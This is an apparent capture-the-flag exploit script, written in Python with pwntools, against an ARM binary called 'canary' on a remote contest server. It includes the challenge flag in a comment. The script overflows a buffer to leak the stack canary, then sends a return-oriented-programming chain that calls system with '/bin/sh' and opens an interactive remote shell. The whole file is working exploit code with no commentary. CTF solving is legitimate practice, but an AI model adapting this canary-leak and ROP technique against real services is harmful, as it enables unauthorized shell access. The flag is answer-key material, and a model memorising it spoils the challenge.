#!/usr/bin/env python
from pwn import *

# hxp{w3lc0m3_70_7h3_31337_club_k1dd0}

e = ELF( './canary' )

context.arch = 'arm'
host , port = '116.203.30.62' , 18113
y = remote( host , port )


p = 'a' * ( 0x28 + 1 )
y.sendafter( '> ' , p )

y.recvuntil( 'a' * ( 0x28 + 1 ) )
canary = u32( '\x00' + y.recv( 3 ) )
success( 'canary -> %s' , hex( canary ) )

ppr = 0x00026b7c # pop {r0, r4, pc}
pop_r1  = 0x0006f088 # pop {r1, pc}


system = 0x16d90
do_system = 0x168EC
sh = 0x00071eb0
main = 0x104b8
puts = 0x177B4

p = flat(
    'a' * 0x28,
    canary,
    ppr,
    sh,
    0,
    ppr,
    sh,
    0,
    do_system
)

print '\n' in p
print hex( e.symbols['open'] )

y.sendafter( '> ' , p )

y.sendafter( '> ' , '\n' )

y.interactive()
